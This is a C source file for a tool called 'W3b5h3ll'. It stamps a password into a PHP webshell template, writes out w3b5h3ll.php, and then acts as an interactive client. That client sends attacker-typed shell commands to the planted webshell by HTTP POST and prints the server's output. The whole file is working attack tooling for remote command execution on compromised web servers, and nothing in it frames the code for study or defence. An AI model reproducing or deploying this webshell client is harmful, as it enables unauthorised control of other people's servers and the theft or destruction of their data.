#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

#define USAGE "Usage : \n\n [+] To Generate Encrypted WebShell :\n  generate [password]\n\n [+] To Connect To The WebShell :\n  connect http [url] [password]\n\n"

char *webshell;
char *editedWebshell;
char request[200] = "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\nUser-Agent: W3b5h3ll\r\n\r\npassword=%s&cnx=http&cmd=%s";
char requestE[1024];
char response[1024];
char host[256];
char file[256];
char cmd[256];

void generateShell(char *password);
void parseURL(char *url);
void http_connection(char *password);
char *parseResponse(char *resp);

int main(int argc, char **argv)
{
	if (argc < 2)
		fprintf(stderr,"%s",USAGE);
	else if (!strcmp(argv[1],"generate") && argc == 3)
	{
		printf("Generating webshell with the password [%s]...\n",argv[2]);
		generateShell(argv[2]);
	}
	else if (!strcmp(argv[1],"connect") && !strcmp(argv[2],"http") && argc == 5)
	{
		parseURL(argv[3]);
		if(!file[0])
		{
			fprintf(stderr,"Error While Parsing The Url\n");
			return 0;	
		}
		printf("Connecting to host : %s , in directory : %s\n",host,file);
		http_connection(argv[4]);
	}
	else
		fprintf(stderr,"%s", USAGE);

	return 0;
}

void generateShell(char *password)
{
	FILE *f = NULL;
	int s = 0;
	int len = strlen(password);
	int p = 63;

	if (!(f = fopen("webshell", "r")))
	{
		fprintf(stderr,"Error While Opening The WebShell !\n");
		exit(EXIT_FAILURE);
	}
	fseek(f,0,SEEK_END);
	s = ftell(f);
	fseek(f,0,SEEK_SET);
	
	webshell = (char*)malloc(s + 1);
	editedWebshell = (char*)malloc(s + len + 1);

	if (fread(webshell, 1, s, f) < 1)
	{
		fprintf(stderr,"Error While Reading The WebShell !\n");
		exit(EXIT_FAILURE);
	}
	webshell[s] = 0;
	fclose(f);

	for (int i = 0, x = 0; i < s; i++, x++)
	{
		if (i == p)
		{
			for (int j = 0; j < len; j++)
				editedWebshell[x + j] = password[j];
			x += len;
		}
		editedWebshell[x] = webshell[i];
	}

	editedWebshell[s + len] = 0;

	if (!(f = fopen("w3b5h3ll.php", "w")))
	{
		fprintf(stderr,"Error While Writing To w3b5h3ll.php !\n");
		exit(EXIT_FAILURE);
	}
	if ((int)fwrite(editedWebshell,1,s+len,f) < s+len)
	{
		fprintf(stderr,"Error While Writing To w3b5h3ll.php !\n");
		exit(EXIT_FAILURE);
	}
	fclose(f);

	printf("Webshell saved Successfully on ./w3b5h3ll.php\n");
}

void parseURL(char *url)
{
	int i = 0, x = 0, y = 0, j = 0;
	while(url[i] && x < 255 && y < 255)
	{
		if(url[i] == '/')
			j = 1;
		if(!j)
			host[x++] = url[i];
	       	else
			file[y++] = url[i];
		i++;	
	}
	host[x] = 0;
	file[y] = 0;

}

char *parseResponse(char *resp)
{
	char *newResp = malloc(1024);
	resp = strstr(resp, "\r\n\r\n") + 4;

	int i = 0,j = 0;
	while(*resp)
	{
		if((*resp) == '\n' && !i)
		{
			i = 1;
			resp++;
		}
		if(i)
			newResp[j++] = (*resp);
		resp++;
	}
	newResp[j] = 0;
	return newResp;
}

void http_connection(char *password)
{
	struct addrinfo hints,*res;
	int s = 0;
	int i = 0;

	memset(&hints,0,sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	
	if(getaddrinfo(host,"80",&hints,&res) != 0)
	{
		fprintf(stderr,"Error In getaddrinfo\n");
		exit(EXIT_FAILURE);
	}

	while(1)
	{
		if((s = socket(res->ai_family,res->ai_socktype,0)) < 0)
		{
			fprintf(stderr,"Error while creating socket !\n");
			exit(EXIT_FAILURE);
		}
		if(connect(s ,res->ai_addr, res->ai_addrlen) < 0)
		{
			fprintf(stderr,"Error While Connecting !");
			exit(EXIT_FAILURE);
		}
		printf("~W3b5h3ll >_");
		if(scanf("%255s",cmd) < 1)
			break;
		if(!strcmp(cmd,"close"))
			break;
		sprintf(requestE, request, file, host, 23 + strlen(password) + strlen(cmd), password, cmd);

		if(send(s, requestE, strlen(requestE), 0) < 1)
		{
			fprintf(stderr,"Error While Sending The Request, Try Again Later !\n");
			continue;
		}
		if((i = recv(s, response, 1024, 0)) < 0)
		{
			fprintf(stderr, "Error While Reading The Response !\n");
			continue;
		}
		response[i] = 0;

		char *resp = parseResponse(response);
		printf("%s\n",resp);
		free(resp);
		close(s);
	}
}
